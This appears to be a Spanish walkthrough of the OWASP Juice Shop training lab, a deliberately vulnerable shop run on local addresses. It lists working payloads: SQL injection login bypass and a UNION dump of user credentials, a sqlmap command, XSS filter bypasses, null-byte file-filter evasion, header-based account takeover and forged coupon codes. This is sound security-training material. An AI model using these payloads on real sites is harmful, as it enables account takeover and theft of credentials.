
# **Write-up: Desafíos de OWASP Juice Shop (v2.19.1)**

* [juice-shop](https://github.com/bkimminich/juice-shop) por [@bkimminich](https://github.com/bkimminich)  

* estado actual:  
  * v2.19.1  
  * 36/37 desafíos resueltos (97%)  

## **Herramientas**

* Herramientas de Kali Linux (2016.2):  
  * Zap proxy  
  * dirb  
  * sqlmap  
* Cuenta de Google para los desafíos 28 y 34 (OAuth2.0)  
* *Motor de búsqueda (Internet)*

## **Notas**

* Inicia Burp y configura un proxy en 127.0.0.1, puerto 8080 (este es el proxy de Burp). Puedes usar el complemento de Firefox 'FoxyProxy Basic' para activar/desactivar rápidamente el uso de un proxy. Ten Burp listo en segundo plano, ya que muchas pruebas se pueden resolver con esta herramienta.  
* Es posible que necesites agregar el certificado CA de Burp a los certificados conocidos de tu navegador.

## **Desafíos**

* [Desafíos de 1 estrella](https://github.com/apox64/OWASP-Juice-Shop-Write-Up/blob/master/juice-shop-writeup.md#1-star-challenges)  
* [Desafíos de 2 estrellas](https://github.com/apox64/OWASP-Juice-Shop-Write-Up/blob/master/juice-shop-writeup.md#2-star-challenges)  
* [Desafíos de 3 estrellas](https://github.com/apox64/OWASP-Juice-Shop-Write-Up/blob/master/juice-shop-writeup.md#3-star-challenges)  
* [Desafíos de 4 estrellas](https://github.com/apox64/OWASP-Juice-Shop-Write-Up/blob/master/juice-shop-writeup.md#4-star-challenges)  
* [Desafíos de 5 estrellas](https://github.com/apox64/OWASP-Juice-Shop-Write-Up/blob/master/juice-shop-writeup.md#5-star-challenges)  

## **Desafíos de 1 estrella**

#### **1: "Encuentra la página 'Score Board' cuidadosamente oculta."**

* No es necesario resolver otro desafío previamente.

Ve a `http://192.168.99.101:3000/#/score-board` para ver el marcador. Esto se resolvió viendo el código fuente HTML del sitio web.

#### **2: "Provoca un error que no se maneje de manera adecuada."**

* No es necesario resolver otro desafío previamente.

Hay muchas formas de resolver esto. Solo busca `' algo`.  
Esto debería manejarse correctamente mostrando algo como "No se encontraron resultados.", pero no lo hace.

#### **3: "XSS Nivel 1: Realiza un ataque XSS reflejado."**

* No es necesario resolver otro desafío previamente.

Solo coloca la siguiente cadena en el campo de búsqueda para reflejar la alerta:  
`<script>alert("XSS1")</script>`, y así completarás el desafío.

#### **4: "Elimina todos los comentarios de clientes con 5 estrellas."**

* Primero, resuelve el desafío 8.

Elimina manualmente todos los comentarios de clientes con 5 estrellas desde la página `/administration` (1 en total).

#### **5: "Accede a un documento confidencial."**

* No es necesario resolver otro desafío previamente.

Usa directory buster (dirb) para listar carpetas en el servidor:  
`dirb "http://192.168.99.101:3000/"`  
Observa aquellas con código de estado "200". La carpeta `/ftp` contiene algunos archivos. Descarga el archivo "acquisitions.md" desde allí.

#### **6: "Accede a la sección de administración de la tienda."**

* Requisitos previos: iniciar sesión como cualquier usuario.

Solo navega a `/#/administration`. Esto se resolvió simplemente adivinando el nombre a partir del desafío.

#### **7: "Envía una reseña devastadora con cero estrellas a la tienda."**

* No es necesario resolver otro desafío previamente.

Ve a "Contact Us", activa la intercepción en Burp, luego envía un comentario con cualquier calificación y cambia el valor en el cuerpo de la solicitud interceptada a `"rating":0`.

## **Desafíos de 2 estrellas**

#### **8: "Inicia sesión con la cuenta de administrador."**

* No es necesario resolver otro desafío previamente.

Obtienes el correo electrónico del administrador en el desafío 6. Puedes omitir la autenticación con una inyección SQL manual simple como:  
`algo' OR 1=1 --` en el campo de correo electrónico. Esto te permitirá iniciar sesión como administrador.

#### **9: "Inicia sesión con las credenciales del administrador sin cambiarlas previamente ni usar inyección SQL."**

* Primero, resuelve el desafío 18.

Descifra el hash de `admin@juice-sh.op` obtenido en el desafío 18: "Recupera una lista de todas las credenciales de usuario mediante inyección SQL". Puedes usar un descifrador MD5 en línea como [hashkiller](https://hashkiller.co.uk/md5-decrypter.aspx) para obtener la contraseña en texto claro.

#### **10: "Accede a la cesta de otra persona."**

* Requisitos previos: iniciar sesión como cualquier usuario.

Usa Burp Intercept para cambiar el valor en el encabezado `GET /rest/basket/4` a cualquier otro número.

#### **11: "Accede a la copia de seguridad olvidada de un vendedor."**

* Primero, resuelve el desafío 5.

Para evitar el error al intentar descargar un archivo `.bak` desde el FTP, podemos usar un null byte (`%00`) para simular la descarga de algo permitido. Necesitamos codificar la URL con `%` como `%25`, seguido del null byte `00` y una extensión permitida.  
`/ftp/coupons_2013.md.bak%2500.pdf` nos permite descargar el archivo `.md.bak`.  
Elimina la extensión `.bak` y abre el archivo con un editor de texto.

#### **12: "Informa a la tienda sobre un algoritmo o biblioteca que definitivamente no debería usarse de la manera en que lo hace."**

* Primero, resuelve el desafío 32.

El algoritmo `rot13` *no* es seguro para codificar datos. También, el algoritmo `z85` no es seguro.

#### **13: "Ordena la oferta especial de Navidad de 2014."**

* Primero, resuelve el desafío 18.  
* Requisitos previos: iniciar sesión como cualquier usuario.

Al experimentar con la carga útil del desafío 18 (inyección SQL), encontramos que la búsqueda con  
`q=something')) UNION ALL SELECT NULL,id,description,price,NULL,NULL,NULL,NULL from products--`  
muestra todos los productos.  
Nuestro producto deseado tiene el ID `9`.  
Ahora, intercepta la solicitud con Burp cuando agregues cualquier otro artículo a tu cesta y cambia el valor de `"ProductID:"` a `9`.  
Realiza el pago y el desafío estará resuelto.

## **Desafíos de 3 estrellas**

#### **14: "Inicia sesión con la cuenta de usuario de Jim."**

* Primero, resuelve el desafío 18.

Descifra el hash de `jim@juice-sh.op` obtenido en el desafío 18. Usa un descifrador MD5 en línea como [hashkiller](https://hashkiller.co.uk/md5-decrypter.aspx) para obtener la contraseña en texto claro.

#### **15: "Inicia sesión con la cuenta de usuario de Bender."**

* Primero, resuelve el desafío 34.

Funciona exactamente como el desafío 34 (Opción: `X-User-Email`).

#### **16: "XSS Nivel 2: Realiza un ataque XSS persistente, evadiendo un mecanismo de seguridad del lado del cliente."**

* No es necesario resolver otro desafío previamente.

Debemos insertar `<script>alert("XSS2")</script>` en algún lugar y lograr que se ejecute sin ser filtrado por un mecanismo de seguridad en JavaScript.  
Ingresarlo en "Contact Us" no funciona.  
Podemos intentar registrar un usuario con este script en sus credenciales para que se almacene en el servidor.  
Si interceptamos el paquete con Burp después de la validación del lado del cliente y lo modificamos, podríamos inyectar el script:  
`{"email":"user@domain.com<script>alert(\"XSS2\")</script>","password": ...}`  

#### **17: "XSS Nivel 3: Realiza un ataque XSS persistente sin utilizar la aplicación frontend."**

* No es necesario resolver otro desafío previamente.

Para modificar algo, no podemos usar `GET`, sino que debemos enviar una solicitud `PUT`.  
Vamos a actualizar la descripción de un producto con nuestro script.  
Si buscamos un producto en la tienda, vemos una solicitud como:  
`GET /rest/product/search?q=O-Saft`  
Si luego abrimos el producto y solicitamos más información, vemos:  
`GET /api/Products/8?d=Thu%20Nov%2010%202016 HTTP/1.1`  

Podemos acceder directamente a `http://192.168.99.100:3000/api/Products/8` y ver los datos en formato JSON.  
Usaremos la API para enviar una solicitud `PUT` y modificar la descripción con nuestro script.

Ejemplo de paquete:

``PUT /api/Products/8 HTTP/1.1
Host: 192.168.99.100:3000
Content-Type: application/json;charset=utf-8
Content-Length: 276
Connection: close
{"description":"<script>alert("XSS3")</script>O-Saft es una herramienta fácil de usar ..."}``


Para eliminar la alerta, simplemente envía la misma solicitud `PUT` sin el script.

#### **18: "Recupera una lista de todas las credenciales de usuario mediante inyección SQL."**

* No es necesario resolver otro desafío previamente.

Parámetros utilizados:

* URL: [http://192.168.99.100:3000](http://192.168.99.100:3000/)  
* Ruta: `/rest/product/search/`  
* Parámetro: `q`  
* Base de datos: `sqlite`  

Comando en `sqlmap`:

``sqlmap -u 'http://192.168.99.100:3000/rest/product/search?q=something' -p 'q' --dbms='sqlite'``


Necesitamos aumentar el nivel de riesgo a `2`:

``--level=2``


Carga útil exitosa:

``q=something')) UNION ALL SELECT NULL,email,password,NULL,NULL,NULL,NULL,NULL from users--``


Podemos descifrar los hashes obtenidos usando [hashkiller](https://hashkiller.co.uk/md5-decrypter.aspx).

#### **19: "Publica comentarios en nombre de otro usuario."**

* Inicia sesión como cualquier usuario.

Ve a "Contact Us", activa Burp Intercept y cambia el valor de `"UserId":` a otro usuario antes de enviar la solicitud.

#### **20: "Realiza un pedido que te haga rico."**

* Inicia sesión como cualquier usuario.

Añade artículos a tu cesta, intercepta la solicitud en Burp y cambia `"quantity":` a un valor negativo antes de reenviar la solicitud.

#### **21: "Accede a la copia de seguridad olvidada de un desarrollador."**

* Primero, resuelve el desafío 11.

Descarga `package.json.bak` utilizando la misma técnica del desafío 11.  
Este archivo contiene las bibliotecas utilizadas y sus versiones, lo que puede ser muy útil.

#### **22: "Cambia el enlace dentro de la descripción del producto O-Saft a `http://kimminich.de`."**

* Primero, resuelve el desafío 17.

Ejemplo de solicitud `PUT`:

``PUT /api/Products/8 HTTP/1.1
Host: 192.168.99.100:3000
Content-Type: application/json;charset=utf-8
Content-Length: 244
Connection: close
{"description":"O-Saft es una herramienta fácil de usar
para mostrar información sobre certificados SSL y
probar la conexión SSL con una lista dada de cifrados
y varias configuraciones SSL.
<a href="http://kimminich.de\" target="_blank">Más información...</a>"}``


#### **23: "Informa a la tienda sobre una biblioteca vulnerable que está utilizando. (Menciona el nombre exacto de la biblioteca y su versión en tu comentario.)"**

* solve challenge 22 first

## Resolver el Desafío 22 Primero

El archivo `package.json.bak` solo necesita que se le elimine la extensión `.bak` al final y luego abrirlo para ver los paquetes que el desarrollador de la tienda utilizó. En la sección "dependencies" puedes encontrar todas las bibliotecas usadas.

Por ejemplo, [snyk.io](https://snyk.io) ofrece una búsqueda web para encontrar vulnerabilidades conocidas:

| Nombre | Versión | ¿Vulnerable? |
|---------|---------|---------------|
| body-parser | 1.15 | Vulnerabilidades Conocidas |
| colors | 1.1 | Vulnerabilidades Conocidas |
| cookie-parser | 1.4 | Vulnerabilidades Conocidas |
| cors | 2.8 | Vulnerabilidades Conocidas |
| errorhandler | 1.4 | Vulnerabilidades Conocidas |
| express | 4.14 | Vulnerabilidades Conocidas |
| express-jwt | 5.1 | Vulnerabilidades Conocidas |
| glob | 5.0 | Vulnerabilidades Conocidas |
| hashids | 1.1 | Vulnerabilidades Conocidas |
| helmet | 2.3 | Vulnerabilidades Conocidas |
| jsonwebtoken | 7.1 | Vulnerabilidades Conocidas |
| morgan | 1.7 | Vulnerabilidades Conocidas |
| multer | 1.2 | Vulnerabilidades Conocidas |
| pdfkit | 0.8 | Vulnerabilidades Conocidas |
| sanitize-html | 1.4.2 | Vulnerabilidades Conocidas |
| saucelabs | 1.3 | Vulnerabilidades Conocidas |
| sequelize | 1.7 | Vulnerabilidades Conocidas |
| sequelize-restful | 0.4 | Vulnerabilidades Conocidas |
| serve-favicon | 2.3 | Vulnerabilidades Conocidas |
| serve-index | 1.8 | Vulnerabilidades Conocidas |
| socket.io | 1.4 | Vulnerabilidades Conocidas |
| sqlite3 | 3.1 | Vulnerabilidades Conocidas |
| z85 | 0.0 | Vulnerabilidades Conocidas |

Envía una de las bibliotecas vulnerables junto con su número de versión en el cuadro de comentarios de la tienda para resolver el desafío.

Aunque `socket.io` y `sequelize-restful` también tienen vulnerabilidades conocidas, actualmente solo reportando `sanitize-html 1.4.2` o `sequelize 1.7` se resuelve el desafío.

---

## Desafío 24: "Encuentra el huevo de pascua oculto."

### Resolver el Desafío 11 Primero

Descarga `eastere.gg` usando la misma técnica descrita en el Desafío 11: "Acceder a un archivo de respaldo olvidado por un vendedor."

---

## Desafío 25: "Viaja en el tiempo a la era dorada del diseño web."

### No se requiere un desafío resuelto previamente

Si revisas el código fuente del botón "HOT", notarás que la imagen está en:

```
css/geo-bootstrap/img/hot.gif
```

Abre la Consola de tu navegador e ingresa el siguiente comando:

```javascript
document.getElementById("theme")
```

Esto devolverá el tema actualmente en uso:

```
href="bower_components/bootswatch/slate/bootstrap.min.css"
```

Necesitas cambiar el `href` a `geo-bootstrap` para activar el CSS correspondiente. Buscando "geo-bootstrap" en Internet, puedes encontrar un proyecto en GitHub con la ruta del archivo CSS:

```
geo-bootstrap/swatch/bootstrap.css
```

Ahora combinamos todo. Configura el tema con el siguiente comando en la Consola:

```javascript
document.getElementById("theme").setAttribute("href", "css/geo-bootstrap/swatch/bootstrap.css")
```

### Nota:
Para revertir el cambio:

```javascript
document.getElementById("theme").setAttribute("href", "bower_components/bootswatch/slate/bootstrap.min.css")
```

o simplemente recarga la página.

---

## Desafío 26: "Sube un archivo de más de 100 kB."

### Iniciar sesión con cualquier usuario

Crea un archivo con contenido aleatorio y extensión `.pdf` que tenga un tamaño menor a 100 kB:

```bash
base64 /dev/urandom | head -c 99900 > random.pdf
```

El archivo resultante tendrá un tamaño de 99.9 kB.

Intercepta y reenvía los paquetes hasta encontrar el correcto. Luego, desplázate hasta el final del texto y agrega al menos 101 caracteres adicionales (o simplemente escribe al azar en el teclado).

---

## Desafío 27: "Sube un archivo que no tenga extensión .pdf."

### Resolver el Desafío 26 Primero

Repite los primeros pasos del Desafío 26 e intercepta el paquete nuevamente. Luego, cambia:

```
filename="random.pdf"
```

a otro nombre de archivo. ¡Desafío resuelto!

---

## Desafío 28: "Inicia sesión con la cuenta de usuario de Bjoern sin cambiar su contraseña previamente, aplicar SQL Injection o hackear su cuenta de Google."

### Resolver el Desafío 6 Primero

1. Inicia sesión con una cuenta válida de Google.
2. Intercepta los paquetes con Burp.
3. Busca el paquete que contiene una solicitud POST a `/api/Users/`.
4. En este paquete, verás que la contraseña no es la misma que usaste para iniciar sesión en Google. Esto se debe a que la tienda Juice Shop nunca ve esa contraseña.
5. Tras probar diferentes codificaciones, notarás que la contraseña creada es la dirección de correo electrónico codificada en Base64.
6. Obtén la dirección de correo de Bjoern desde la sección `/administration`.
7. Codifícala en Base64 e inicia sesión con ella.

## **Desafíos de 4 Estrellas**

#### **29: "XSS Nivel 4: Realizar un ataque XSS persistente eludiendo un mecanismo de seguridad del servidor."**

* Primero resuelve el desafío 24.

Veamos qué implementó el desarrollador en el lado del servidor: `"sanitize-html": "1.4.2"`.
Existe un problema porque la sanitización no se aplica de manera recursiva, por lo que si insertamos un script dentro de otro script, solo el script externo será sanitizado, mientras que el interno seguirá ejecutándose.  

```html
<script>alert("XSS4")</script>
```

Colocaremos la misma cadena después del primer `<` y la `s`, de modo que se vea así:  

```html
<<script>alert("XSS4")</script>script>alert("XSS4")</script>
```

Además, necesitamos otra etiqueta de cierre `</script>` antes de la última etiqueta `</script>` para que se ejecute:  

```html
<<script>alert("XSS4")</script>script>alert("XSS4")<</script>/script>
```

Puedes publicar esto en "Contáctanos" para resolver el desafío.

---

#### **30: "A donde sea que vayas, ahí estarás."**

* No es necesario resolver ningún desafío previo.

La cinta en la esquina superior derecha "Fork me on Github" contiene el enlace `/redirect?to=https://github.com/bkimminich/juice-shop`.  
Como siempre, cuando manipulamos URLs, debemos probar con null-bytes `%00`.  

Al visitar:  

```
/redirect?to=/%00https://github.com/bkimminich/juice-shop
```

Le proporcionamos al redireccionamiento un destino válido (`https://github.com/bkimminich/juice-shop`), pero evitamos que realmente nos lleve allí.

---

#### **31: "Cambia la contraseña de Bender a slurmCl4ssic."**

* Primero resuelve el desafío 15.  
* Debes estar autenticado como Bender.

Al cambiar la contraseña, podemos interceptar un paquete con una solicitud `GET` como esta:  

```
GET /rest/user/change-password?current=idontknow&new=slurmCl4ssic&repeat=slurmCl4ssic
```

Eliminemos el parámetro `current` y veamos si aún es aceptado:  

```
GET /rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic
```

Sí, la contraseña se cambia.  
Ahora hemos cambiado la contraseña sin conocer la anterior.  

**NOTA:**  
El hash MD5 de "slurmCl4ssic" es `06b0c5c1922ed4ed62a5449dd209c96d`.  
Aunque Hashkiller no tiene actualmente una entrada que revierta este hash, la contraseña en texto plano "slurmCl4ssic" no es segura, ya que podría añadirse a una base de datos en el futuro.

---

#### **32: "Aplica análisis criptográfico avanzado para encontrar el verdadero huevo de pascua."**

* Primero resuelve el desafío 25.

En el archivo `eastere.gg` de `/ftp`, hay una cadena:  

```
L2d1ci9xcmlmL25lci9mYi9zaGFhbC9ndXJsL3V2cS9uYS9ybmZncmUvcnR0L2p2Z3V2YS9ndXIvcm5mZ3JlL3J0dA==
```

Al decodificarlo con Base64 (Burp Decoder puede hacerlo), obtenemos:  

```
/gur/qrif/ner/fb/shaal/gurl/uvq/na/rnfgre/rtt/jvguva/gur/rnfgre/rtt
```

Parece una ruta. No nos lleva a ningún lado directamente, pero estamos cerca (porque podemos ver las barras `/`).  
Podría ser un cifrado de desplazamiento.  

Después de probar un poco, descubrimos que es un cifrado **ROT-13**.  
Al decodificarlo, obtenemos:  

```
the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg
```

Siguiendo este enlace, se resuelve el desafío y se nos muestra una enorme naranja en JavaScript como recompensa.

---

#### **33: "Recupera el archivo de idioma que nunca llegó a producción."**

* Primero resuelve el desafío 5.

Cambia el idioma varias veces y revisa el historial de solicitudes HTTP.  
Puedes ver que los archivos están en la carpeta `/i18n/` y tienen extensión `.json`.  

Ejemplo:  

```
GET /i18n/sv.json HTTP/1.1
```

Podemos usar `dirb` para escanear todos los archivos de idioma, pero necesitamos una lista completa de palabras. Generemos nuestra propia lista:

```python
#!/usr/bin/python

from itertools import product
from string import ascii_lowercase

length = input("Ingrese la longitud de las palabras a generar: ")
print("Generando lista de palabras con longitud", length)

f = open('wordlist.txt', 'w')

for count, i in enumerate(product(ascii_lowercase, repeat=length)):
    f.write(''.join(i) + '\n')

print("Palabras generadas: %d" % count)

f.close()
```

Generamos todas las palabras con longitud 3 y luego ejecutamos `dirb` con los siguientes parámetros:  

```
dirb "http://192.168.99.100:3000/i18n/" wordlist.txt -X .json
```

Con este método, encontramos `tlh.json` (Klingon) y resolvemos el desafío.

---

#### **34: "Exploita OAuth 2.0 para iniciar sesión con la cuenta del Director de Seguridad de la Información."**

* Primero resuelve el desafío 6.

Inicia sesión con una cuenta válida de Google e intercepta la comunicación con Burp.  
Busca el paquete que contiene la solicitud `POST` a `/rest/user/login` y agrega manualmente la cabecera:  

```
X-User-Email: ciso@juice-sh.op
```

Puedes dejar el cuerpo de la solicitud como está:

```json
{
  "email": "something@gmail.com",
  "password": "c29tZXRoaW5nQGdtYWlsLmNvbQ==",
  "oauth": true
}
```

Esto permite iniciar sesión como el CISO y completar el desafío.

## **Desafíos de 5 Estrellas**

#### **35: "Forja un código de cupón que te otorgue un descuento de al menos el 80%."**

* Primero, resuelve el desafío 11.

El archivo "coupons\_2013.md" en la carpeta /ftp contiene algunos códigos. Estos están codificados con "z85" [bkimminich/z85-cli](https://github.com/bkimminich/z85-cli), también presente en "package.json.bak" bajo "Dependencies". Escribí este pequeño script que recorre el archivo "coupons\_2013.md" y muestra las cadenas decodificadas.  
\#\!/bin/bash  
file="/root/Downloads/coupons\_2013.md"  
while IFS= read \-r line  
do  
	eval "z85 \-d \"$line\""  
done <"$file"  

Deberías poder notar un patrón aquí: "MMMYY-DD" (MesAño-Descuento). Crea tu propio código con el mes actual, por ejemplo, "NOV16-90".  
Codifícalo con z85:  

z85 \-e "NOV16-90"  

Esta cadena te dará un valor codificado en z85 como `pes[Bhz3{y`. Ingrésalo en la opción de cupón y resuelve el desafío.

#### **36: "Falsifica un código de continuación que solo resuelva el (inexistente) desafío #99."**

* Primero, resuelve el desafío 21.

En el archivo package.json del servidor FTP encontramos que se utilizó `hashids`. Investigando en la web, encontramos este sitio: `http://hashids.org/`. En la página de demostración, podemos jugar con el mecanismo de hash. Se puede especificar un número (por defecto `8`) que determina la longitud del hash de salida. Los códigos de continuación tienen 60 caracteres de largo, así que reemplazamos 8 por 60. 

Intentemos decodificar un código de continuación válido cambiando la variable `numbers`...

```javascript
var numbers = hashids.decode("1ZQmmZnR751JxwB4KjXVoQMzD8AWqH3u4G6LYgl29OvP3aENeqWpbykroVl3");
```

Este código de continuación se decodifica en `[1,2,34]`. ¡Parecen ser los números de los desafíos ya resueltos!

Debes anotar tus números (tus desafíos resueltos) en algún lugar para restaurar tu progreso más tarde. 

Ahora, intentemos codificar solo el número `99` con los mismos parámetros *("this is ...", 60, "abcdef ...")*.

```javascript
var id = hashids.encode(99);
```

El código de continuación resultante `69OxrZ8aJEgxONZyWoz1Dw4BvXmRGkKgGe9M7k2rK63YpqQLPjnlb5V5LvDj` resuelve el desafío.

Para restaurar tu progreso, simplemente genera otro código de continuación con los números que anotaste anteriormente.




